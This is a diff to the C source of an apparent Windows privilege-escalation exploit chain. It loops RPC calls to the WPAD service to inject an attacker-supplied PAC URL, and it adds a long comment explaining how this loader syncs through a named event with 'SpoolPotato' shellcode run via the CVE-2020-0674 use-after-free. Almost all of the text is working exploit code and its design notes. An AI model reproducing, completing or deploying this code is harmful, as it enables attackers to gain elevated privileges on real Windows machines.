@@ -202,6 +202,7 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
             while (TRUE) {
                 DebugLog(L"... sending PAC update RPC signal to WPAD...");
                 WpadInjectPac(TARGET_PAC_URL);
+
                 if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0) {
                     DebugLog(L"... received sync signal from SpoolPotato");
                     break;
@@ -227,12 +228,38 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
         DebugLog(L"... no PAC URL argument provided");
     }
     else {
+        /*
+        SpoolPotato/WPAD client synchronization
+
+        Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
+        the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
+        often yield a successful status from WPAD.
+
+        To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
+        attempt to trigger the PAC download until it receives confirmation via an event object from within
+        the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
+        the CVE-2020-0674 UAF.
+
+        The WPAD client initially:
+        1. Creates an unsignalled event object and then proceeds to repeatedly make RPC calls to WPAD in a loop
+        2. Between each iteration of the loop it spends several seconds waiting for a signal on its event object.
+           If this operation times out, it continues the loop.
+        3. Once the event has been signalled the WPAD client ends its loop and terminates.
+
+        Meanwhile the SpoolPotato shellcode:
+        1. Makes its privilege escalation operations.
+        2. Waits for the named event object from the WPAD client to be created.
+        3. Signals the event object once it has been created.
+        4. Terminates itself.
+        */
+
         HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, L"DoubleStarSync");
 
         while (TRUE) {
             DebugLog(L"... sending PAC update RPC signal to WPAD...");
             RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
             DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+
             if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0) {
                 DebugLog(L"... received sync signal from SpoolPotato");
                 break;
